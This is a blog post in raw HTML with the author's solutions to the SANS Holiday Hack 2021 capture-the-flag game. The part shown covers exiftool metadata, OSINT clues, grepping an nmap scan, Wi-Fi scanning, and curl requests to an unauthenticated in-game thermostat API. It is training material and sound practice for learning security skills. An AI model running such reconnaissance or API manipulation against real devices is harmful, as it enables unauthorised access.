<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>Some SANS Holiday Hack 2021 Solutions</title><link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.97.3"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image:src content="https://parsiya.net/blog/2022-01-21-some-sans-holiday-hack-2021-solutions/.png"><meta name=twitter:title content="Some SANS Holiday Hack 2021 Solutions"><meta name=twitter:description content="Here are some of my answers to the SANS Holiday Hack 2021. As usual, it's a
pretty fun and accessible challenge.
Previous writeups:












  
  
  
  
  








  
  













  




SANS Holiday Hack 2018 Solutions











  
  
  
  
  








  
  













  




Some SANS Holiday Hack 2019 Solutions











  
  
  
  
  








  
  













  




Some SANS Holiday Hack 2020 Solutions
"><meta name=twitter:domain content="parsiya.net"><meta name=twitter:creator content="@CryptoGangsta"></head><body><header role=banner><hgroup><h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1><h2>The knowledge of anything, since all things have causes, is not acquired or
complete unless it is known by its causes. - Avicenna</h2></hgroup></header><nav role=navigation><fieldset class=mobile-nav><select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select></fieldset><ul class=main-navigation><li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li><li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li><li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li><li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li><li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li><li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li></ul><ul class=subscription><a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a></ul><form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer"><fieldset role=search><input class=search type=text name=q results=0 placeholder=Search>
<input type=hidden name=q value=site:https://parsiya.net/></fieldset></form></nav><div id=main><div id=content><div><article class=hentry role=article><header><p class=meta>Jan 21, 2022
- 37 minute read
- <a href=https://parsiya.net/blog/2022-01-21-some-sans-holiday-hack-2021-solutions/#disqus_thread>Comments</a>
- <a class=label href=https://parsiya.net/categories/writeup/>Writeup </a><a class=label href=https://parsiya.net/categories/holiday-hack/>Holiday Hack</a></p><h1 class=entry-title>Some SANS Holiday Hack 2021 Solutions</h1></header><div class=entry-content><nav id=TableOfContents><ul><li><a href=#note>Note</a></li><li><a href=#1-kringlecon-orientation>1) KringleCon Orientation</a></li><li><a href=#2-where-in-the-world-is-caramel-santaigo>2) Where in the World is Caramel Santaigo?</a><ul><li><a href=#piney-sappington---exif-metadata>Piney Sappington - Exif Metadata</a></li><li><a href=#tangle-coalbox---caramel-santaigo>Tangle Coalbox - Caramel Santaigo</a></li></ul></li><li><a href=#3-thaw-frost-towers-entrance>3) Thaw Frost Tower's Entrance</a><ul><li><a href=#greasy-gopherguts---grepping-for-gold>Greasy GopherGuts - Grepping for Gold</a><ul><li><a href=#1-what-port-does-3476122-have-open>1. What port does 34.76.1.22 have open?</a></li><li><a href=#2-what-port-does-3477207226-have-open>2. What port does 34.77.207.226 have open?</a></li><li><a href=#3-how-many-hosts-appear-up-in-the-scan>3. How many hosts appear "Up" in the scan?</a></li><li><a href=#4-how-many-hosts-have-a-web-port-open>4. How many hosts have a web port open?</a></li><li><a href=#5-how-many-hosts-with-status-up-have-no-detected-open-tcp-ports>5. How many hosts with status Up have no (detected) open TCP ports?</a></li><li><a href=#6-whats-the-greatest-number-of-tcp-ports-any-one-host-has-open>6. What's the greatest number of TCP ports any one host has open?</a></li></ul></li><li><a href=#grimy-mctrollkins---thaw-frost-tower>Grimy McTrollkins - Thaw Frost Tower</a></li></ul></li><li><a href=#4-slot-machine-investigation>4) Slot Machine Investigation</a><ul><li><a href=#noel-boetie---logic-munchers>Noel Boetie - Logic Munchers</a></li><li><a href=#slot-machine>Slot Machine</a></li></ul></li><li><a href=#5-strange-usb-device>5) Strange USB Device</a><ul><li><a href=#jewel-loggins---ipv6-sandbox>Jewel Loggins - IPv6 Sandbox</a></li><li><a href=#morcel-nougat---strange-usb-device>Morcel Nougat - Strange USB Device</a></li></ul></li><li><a href=#6-shellcode-primer>6) Shellcode Primer</a><ul><li><a href=#chimney-scissorsticks---santas-holiday-hero>Chimney Scissorsticks - Santa's Holiday Hero</a></li><li><a href=#shellcode-primer>Shellcode Primer</a><ul><li><a href=#5-system-calls>5. System Calls</a></li><li><a href=#7-getting-rip>7. Getting RIP</a></li><li><a href=#8-hello-world>8. Hello, World!</a></li><li><a href=#9-hello-world>9. Hello World!!</a></li><li><a href=#10-opening-a-file>10. Opening a File</a></li><li><a href=#11-reading-a-file>11. Reading a File</a></li></ul></li></ul></li><li><a href=#7-printer-exploitation>7) Printer Exploitation</a><ul><li><a href=#frostavator>Frostavator</a></li><li><a href=#ruby-cyster---printer-exploitation>Ruby Cyster - Printer Exploitation</a><ul><li><a href=#building-hash_extender-on-wsl>Building hash_extender on WSL</a></li><li><a href=#what-should-we-append>What Should We Append?</a></li></ul></li></ul></li><li><a href=#9-splunk>9) Splunk!</a><ul><li><a href=#fitzy-shortstack---yara-analysis>Fitzy Shortstack - Yara Analysis</a></li><li><a href=#angel-candysalt---splunk>Angel Candysalt - Splunk!</a><ul><li><a href=#task-1>Task 1</a></li><li><a href=#task-2>Task 2</a></li><li><a href=#task-3>Task 3</a></li><li><a href=#task-4>Task 4</a></li><li><a href=#task-5>Task 5</a></li><li><a href=#task-6>Task 6</a></li><li><a href=#task-7>Task 7</a></li><li><a href=#task-8>Task 8</a></li></ul></li></ul></li><li><a href=#10-now-hiring>10) Now Hiring!</a><ul><li><a href=#noxious-o-dor---imds-exploration>Noxious O. D'or - IMDS Exploration</a></li><li><a href=#now-hiring>Now Hiring!</a></li></ul></li><li><a href=#11-customer-complaint-analysis>11) Customer Complaint Analysis</a><ul><li><a href=#pat-tronizer>Pat Tronizer</a></li><li><a href=#tinsel-upatree---strace-ltrace-retrace>Tinsel Upatree - Strace Ltrace Retrace</a></li><li><a href=#customer-complaint-analysis>Customer Complaint Analysis</a></li></ul></li></ul></nav><p>Here are some of my answers to the SANS Holiday Hack 2021. As usual, it's a
pretty fun and accessible challenge.</p><p>Previous writeups:</p><ul><li><a href=/blog/2019-01-15-sans-holiday-hack-challenge-2018-solutions/ title="SANS Holiday Hack 2018 Solutions" rel=nofollow target=_blank>SANS Holiday Hack 2018 Solutions</a></li><li><a href=/blog/2020-01-15-some-sans-holiday-hack-2019-solutions/ title="Some SANS Holiday Hack 2019 Solutions" rel=nofollow target=_blank>Some SANS Holiday Hack 2019 Solutions</a></li><li><a href=/blog/2021-01-17-some-sans-holiday-hack-2020-solutions/ title="Some SANS Holiday Hack 2020 Solutions" rel=nofollow target=_blank>Some SANS Holiday Hack 2020 Solutions</a></li></ul><h1 id=note>Note
<a class=header-link href=#note><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>The only <code>novel</code> thing in this blog is how I used local overrides to modify
the webpage JavaScript to solve the
<a href=#xchimney-scissorsticks---santas-holiday-hero>Santa's Holiday Hero</a> challenge.
I owe it to the <code>[redacted]</code> game team for using gRPC in their companion app so
I used it to debug and modify their client-side JavaScript.</p><h1 id=1-kringlecon-orientation>1) KringleCon Orientation
<a class=header-link href=#1-kringlecon-orientation><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><ul><li>1a) Talk to Jingle Ringford</li><li>1b) Get your badge</li><li>1c) Get the wifi adapter</li><li>1d) Use the terminal</li></ul><h1 id=2-where-in-the-world-is-caramel-santaigo>2) Where in the World is Caramel Santaigo?
<a class=header-link href=#2-where-in-the-world-is-caramel-santaigo><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Help Tangle Coalbox find a wayward elf in Santa's courtyard. Talk to Piney
Sappington nearby for hints.</p></blockquote><p>There are some other people around but I want to find this objective first and
go by the numbers. To get there I have to go into Kringlecon on the left, then
take the first right to get in the room with the Splunk challenge and take door
that goes to the courtyard.</p><h2 id=piney-sappington---exif-metadata>Piney Sappington - Exif Metadata
<a class=header-link href=#piney-sappington---exif-metadata><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Someone has tampered with some files. We need to use <code>exiftool</code> to figure it
out.</p><p>We might need to look at the geotags?</p><blockquote><p>And, if you help me figure this tampering issue out, I'll give you some hints
about OSINT, especially associated with geographic locations!</p></blockquote><p>A bunch of docx files with the same timestamp.</p><p>The files are based on dates <code>2021-12-01.docx</code> and so on. If we extract the
metadata with <code>exiftool 2021-12-02.docx</code> we get this in the end of the list
<code>Modify Date: 2021-12-02 00:00:00</code>. The tampered files might have been modified
after the date in the filename.</p><p><code>Modify Date</code> is the description of the tag. To see the tags we have to use the
<code>-s</code> option. <code>exiftool -s 2021-12-01.docx</code> and it's <code>ModifyDate</code>. Now, we can
only extract <code>ModifyDate</code> and <code>FileName</code>.</p><p><code>exiftool -FileName -ModifyDate .</code> and one file has a different date.</p><pre tabindex=0><code>./2021-12-21.docx
File Name:      2021-12-21.docx
Modify Date:    2021-12-24 23:59:59z
</code></pre><p>If we do <code>exiftool -s 2021-12-21.docx</code> we can see the <code>LastModifiedBy</code> tag is
<code>jack Frost</code>.</p><p><strong>Answer is:</strong> <code>2021-12-21.docx</code>.</p><p>We get hints from Piney:</p><blockquote><p>So anyway, some of the hints use obscure coordinate systems like MGRS and even
what3words.</p><p>In some cases, you might get an image with location info in the metadata. Good
thing you know how to see that stuff now!</p><p>(And they say, for those who don't like gameplay, there might be a way to
bypass by looking at some flavor of cookie...)</p><p>And Clay Moody is giving a talk on OSINT techniques right now!</p><p>Oh, and don't forget to learn about your target elf and filter in the
Interrink system!</p></blockquote><h2 id=tangle-coalbox---caramel-santaigo>Tangle Coalbox - Caramel Santaigo
<a class=header-link href=#tangle-coalbox---caramel-santaigo><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Some elves are lost, find them. The sequences are randomized so you might have
gotten different ones.</p><p>Investigating:</p><ol><li>They said, if asked, they would describe their next location in three words
as "frozen, push, and tamed.<ol><li>This is a <code>what3words</code> clue for the Big Ben clock in London.</li></ol></li><li>They were checking the Ofcom frequency table to see what amateur frequencies
they could use while there.<ol><li>Ofcom is a regulatory authority for England. Another London clue.</li><li>They were dressed for 4.0°C and sunny conditions. They kept checking their
Slack app.</li></ol></li></ol><p>We can answer one interlink question:</p><ul><li>Preferred social medium: Slack</li></ul><p>Possible elves:</p><ul><li>Morcel Nougat</li><li>Ginger Breddie</li><li>Ribb Bonbowford</li></ul><p>Let's go to London, England.</p><ol><li>Buddy, a close friend of the elves, once went on an ice skating date under
their huge Christmas tree!<ol><li>This points to New York and is a clue from the movie Elf. Buddy the dog
skated under a huge Christmas tree in NYC.</li></ol></li><li>They sent me this blurry selfie of themself or someone they met:<ol><li>Purple hat, blue coat?</li></ol></li><li>They were dressed for 2.2°C and partly cloudy conditions. The elf mentioned
something about Stack Overflow and Golang.</li></ol><p>Another interlink question:</p><ul><li>Language spoken: Golang.</li></ul><p>Possible elves:</p><ul><li>Morcel Nougat</li></ul><p>Next stop is New York.</p><ol><li>Their next waypoint was something like 51.219, 4.402.<ol><li>These coordinates point to Antwerp, Belgium.</li></ol></li><li>They just contacted us from an address in the 81.244.0.0/14 range.</li><li>They were dressed for 4.0°C and overcast conditions. Oh, I noticed they had a
Firefly themed phone case.</li></ol><p>We can answer another clue although we have the answer:</p><ul><li>Fandom: Firefly.</li></ul><p>Let's go to Antwerp.</p><ol><li>First investigation was "you just missed the elf"</li><li>Second was, you caught up to the elf.</li></ol><p><strong>Answer:</strong> <code>Marcel Nougat</code>.</p><h1 id=3-thaw-frost-towers-entrance>3) Thaw Frost Tower's Entrance
<a class=header-link href=#3-thaw-frost-towers-entrance><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Turn up the heat to defrost the entrance to Frost Tower. Click on the Items
tab in your badge to find a link to the Wifi Dongle's CLI interface. Talk to
Greasy Gopherkins outside the tower for tips.</p></blockquote><p>We go all the way back to the "Castle Approach" (initial area after going
through the gate). Go right and you see <code>Greasy GopherGuts</code>. Seems like it's a
typo because the clue says to look for <code>Greasy Gopherkins</code>.</p><h2 id=greasy-gopherguts---grepping-for-gold>Greasy GopherGuts - Grepping for Gold
<a class=header-link href=#greasy-gopherguts---grepping-for-gold><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Needs help parsing nmap output and will give us wi-fi hints.</p><p>We have to search <code>bigscan.gnmap</code> and answer some questions. It's "greppable" so
we should be able to grep for things.</p><p>Answer all the questions in the quizme executable:</p><h3 id=1-what-port-does-3476122-have-open>1. What port does 34.76.1.22 have open?
<a class=header-link href=#1-what-port-does-3476122-have-open><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p><code>62078</code></p><pre tabindex=0><code>$ grep &#34;34.76.1.22&#34; bigscan.gnmap 
Host: 34.76.1.22 ()     Status: Up
Host: 34.76.1.22 ()     Ports: 62078/open/tcp//iphone-sync///      Ignored State: closed (999)
</code></pre><h3 id=2-what-port-does-3477207226-have-open>2. What port does 34.77.207.226 have open?
<a class=header-link href=#2-what-port-does-3477207226-have-open><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p><code>8080</code></p><pre tabindex=0><code>$ grep &#34;34.77.207.226&#34; bigscan.gnmap 
Host: 34.77.207.226 ()     Status: Up
Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored State: filtered (999)
</code></pre><h3 id=3-how-many-hosts-appear-up-in-the-scan>3. How many hosts appear "Up" in the scan?
<a class=header-link href=#3-how-many-hosts-appear-up-in-the-scan><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p><code>26054</code></p><pre tabindex=0><code>$ grep &#34;Status: Up&#34; bigscan.gnmap | wc -l
26054
</code></pre><h3 id=4-how-many-hosts-have-a-web-port-open>4. How many hosts have a web port open?
<a class=header-link href=#4-how-many-hosts-have-a-web-port-open><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p><code>15242</code></p><p>(Let's just use TCP ports 80, 443, and 8080).</p><pre tabindex=0><code>$ grep -E &#34;(80|443|8080)\/open&#34; bigscan.gnmap | wc -l
14372
</code></pre><h3 id=5-how-many-hosts-with-status-up-have-no-detected-open-tcp-ports>5. How many hosts with status Up have no (detected) open TCP ports?
<a class=header-link href=#5-how-many-hosts-with-status-up-have-no-detected-open-tcp-ports><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p><code>402</code></p><p>This is a math problem. We don't need an extra grep command for this.</p><p>There are two types of lines in the file (excluding the first and last lines
which are comments).</p><ol><li><code>Host: 1.2.3.4 () Status: Up</code></li><li><code>Host: 1.2.3.4 () Ports: ...</code></li></ol><p>We are looking for the number of the hosts without an associated <code>Ports</code> line.
So we calculate each and then subtract.</p><ul><li>Number of <code>Up</code> lines: 26054.</li><li>Number of <code>Ports</code> lines: 15242.</li><li>Answer = 26054 - 25652 = 402.</li></ul><h3 id=6-whats-the-greatest-number-of-tcp-ports-any-one-host-has-open>6. What's the greatest number of TCP ports any one host has open?
<a class=header-link href=#6-whats-the-greatest-number-of-tcp-ports-any-one-host-has-open><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p><code>12</code></p><p>Each port line looks like this:</p><pre tabindex=0><code>Host: 34.76.0.44 ()
   Ports: 135/open/tcp//msrpc///, 137/open/tcp//netbios-ns///,
   139/open/tcp//netbios-ssn///, 3389/open/tcp//ms-wbt-server///
   Ignored State: closed (996)
</code></pre><p>We can grep for <code>/open</code> and then only select lines with matches. We can even
store them in a separate line. However, we need to figure out which line has the
most number of <code>open</code>s and how many.</p><pre tabindex=0><code>$ grep -n -o &#34;open&#34; bigscan.gnmap | uniq -c | sort -n
...
12 11871:open
12 20450:open
12 26124:open
12 39743:open
12 43460:open
</code></pre><p>Our hint:</p><blockquote><p>Scanning for Wi-Fi networks with iwlist will be location-dependent. You may
need to move around the North Pole and keep scanning to identify a Wi-Fi
network.</p><p>Wireless in Linux is supported by many tools, but iwlist and iwconfig are
commonly used at the command line.</p><p>The curl utility can make HTTP requests at the command line!</p><p>By default, curl makes an HTTP GET request. You can add --request POST as a
command line argument to make an HTTP POST request.</p><p>When sending HTTP POST, add --data-binary followed by the data you want to
send as the POST body.</p></blockquote><h2 id=grimy-mctrollkins---thaw-frost-tower>Grimy McTrollkins - Thaw Frost Tower
<a class=header-link href=#grimy-mctrollkins---thaw-frost-tower><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>There's another char standing near the door named <code>Grimy McTrollkins</code>.</p><pre tabindex=0><code>I think we can melt the door open if we can just get access to the thermostat
inside the building.

That thermostat uses Wi-Fi. And I&#39;ll bet you picked up a Wi-Fi adapter for your
badge when you got to the North Pole.

Click on your badge and go to the Items tab. There, you should see your Wi-Fi
Dongle and a button to “Open Wi-Fi CLI.” That&#39;ll give you command-line interface
access to your badge&#39;s wireless capabilities.
</code></pre><p>Let's open the Wi-Fi CLI near the door.</p><p>We need to find the interface, it's <code>wlan0</code>.</p><pre tabindex=0><code>$ iwconfig
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=22 dBm   
          Retry:off   RTS thr:off   Fragment thr=7 B   
          Power Management:on
</code></pre><p>Now, we can scan for networks and find one named <code>FROST-Nidus-Setup</code>.</p><pre tabindex=0><code>$ iwlist wlan0 scan
wlan0     Scan completed :
          Cell 01 - Address: 02:4A:46:68:69:21
                    Frequency:5.2 GHz (Channel 40)
                    Quality=48/70  Signal level=-62 dBm  
                    Encryption key:off
                    Bit Rates:400 Mb/s
                    ESSID:&#34;FROST-Nidus-Setup&#34;
</code></pre><p>We can connect to it.</p><pre tabindex=0><code>$ iwconfig wlan0 essid &#34;FROST-Nidus-Setup&#34;

** New network connection to Nidus Thermostat detected! Visit
http://nidus-setup:8080/ to complete setup (The setup is compatible with the
&#39;curl&#39; utility)
</code></pre><p>Let's see the page.</p><pre tabindex=0><code>$ curl http://nidus-setup:8080
◈──────────────────────────────────────────────────────────────────────────────◈
Nidus Thermostat Setup
◈──────────────────────────────────────────────────────────────────────────────◈

WARNING Your Nidus Thermostat is not currently configured! Access to this
device is restricted until you register your thermostat » /register. Once you
have completed registration, the device will be fully activated.

In the meantime, Due to North Pole Health and Safety regulations
42 N.P.H.S 2600(h)(0) - frostbite protection, you may adjust the temperature.

API

The API for your Nidus Thermostat is located at http://nidus-setup:8080/apidoc
</code></pre><p>We need to see the API docs at http://nidus-setup:8080/apidoc and figure out how
to either register or change the temperature.</p><pre tabindex=0><code>$ curl http://nidus-setup:8080/apidoc
◈──────────────────────────────────────────────────────────────────────────────◈
Nidus Thermostat API
◈──────────────────────────────────────────────────────────────────────────────◈

The API endpoints are accessed via:

http://nidus-setup:8080/api/&lt;endpoint&gt;

Utilize a GET request to query information; for example, you can check the
temperatures set on your cooler with:

curl -XGET http://nidus-setup:8080/api/cooler

Utilize a POST request with a JSON payload to configuration information; for
example, you can change the temperature on your cooler using:

curl -XPOST -H &#39;Content-Type: application/json&#39; \
  --data-binary &#39;{&#34;temperature&#34;: -40}&#39; \
  http://nidus-setup:8080/api/cooler


* WARNING: DO NOT SET THE TEMPERATURE ABOVE 0! That might melt important furniture

Available endpoints

┌─────────────────────────────┬────────────────────────────────┐
│ Path                        │ Available without registering? │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/cooler                 │ Yes                            │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/hot-ice-tank           │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/snow-shower            │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/melted-ice-maker       │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/frozen-cocoa-dispenser │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/toilet-seat-cooler     │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/server-room-warmer     │ No                             │ 
└─────────────────────────────┴────────────────────────────────┘
</code></pre><p>The current temperature is:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>$ curl -XGET http:<span style=color:#586e75>//nidus-setup:8080/api/cooler
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;temperature&#34;</span>: <span style=color:#2aa198>-39.2</span>,
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;humidity&#34;</span>: <span style=color:#2aa198>87.84</span>,
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;wind&#34;</span>: <span style=color:#2aa198>8.69</span>,
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;windchill&#34;</span>: <span style=color:#2aa198>-49.28</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We can adjust the temperature without registering. The page has an example:</p><pre tabindex=0><code>curl -XPOST -H &#39;Content-Type: application/json&#39; \
  --data-binary &#39;{&#34;temperature&#34;: -40}&#39; \
  http://nidus-setup:8080/api/cooler
